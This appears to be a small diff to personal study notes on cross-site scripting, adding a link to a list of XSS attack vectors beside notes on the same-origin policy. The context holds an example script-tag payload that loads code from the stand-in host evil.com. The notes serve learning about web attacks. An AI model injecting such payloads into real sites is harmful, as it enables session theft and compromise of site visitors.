@@ -29,6 +29,7 @@ Malicious JS can access to all object that web page has access to
 A policy that stops one website from reading or writing data to another. Checks for three things: *Protocol, Host, Port* 
 
 ## XSS Attack Vectors 
+[List of attack vectors](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)
 ### <script> tag 
 Most straightforward XSS payload. Can reference external JS cde or can embed code within script tage itself. 
 `<script src=http://evil.com/xss.js></script>`
